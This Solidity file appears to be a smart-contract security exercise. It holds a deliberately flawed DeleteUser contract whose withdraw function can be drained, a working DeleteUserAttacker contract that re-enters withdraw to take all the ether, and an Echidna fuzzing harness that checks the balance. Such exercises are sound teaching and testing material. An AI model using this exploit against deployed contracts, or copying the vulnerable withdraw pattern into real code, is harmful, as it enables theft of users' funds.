pragma solidity 0.8.15;

/**
 * This contract starts with 1 ether.
 * Your goal is to steal all the ether in the contract.
 *
 */

contract DeleteUser {
    struct User {
        address addr;
        uint256 amount;
    }

    User[] public users;

    function deposit() external payable {
        users.push(User({addr: msg.sender, amount: msg.value}));
    }

    function withdraw(uint256 index) external {
        User storage user = users[index];
        require(user.addr == msg.sender);
        uint256 amount = user.amount;

        user = users[users.length - 1];
        users.pop();

        msg.sender.call{value: amount}("");
    }
}

contract DeleteUserAttacker {
    DeleteUser user;

    constructor(address _user) {
        user = DeleteUser(_user);
    }
    receive() external payable {
        if (address(user).balance >= 1 ether) {
            user.withdraw(0);
        }
    }

    function attack() external payable {
        user.deposit{value: msg.value}();
        user.withdraw(1);
    }
}

contract FuzzDeleteUser is DeleteUser {
    // Constructor to initialize the contract state

    constructor() payable {
        require(msg.value == 1 ether, "Must deposit exactly 1 Ether");
        users.push(User({addr: address(0), amount: msg.value}));
    }
    function testDeposit() public payable {
        users.push(User({addr: msg.sender, amount: msg.value}));
    }
    function testWithdraw(uint256 index) public {
        User storage user = users[index];
        require(user.addr == msg.sender);
        uint256 amount = user.amount;

        user = users[users.length - 1];
        users.pop();

        msg.sender.call{value: amount}("");
    }

    function echidna_test_balance() public view returns (bool) {
        return address(this).balance >= 1 ether;
    }
}
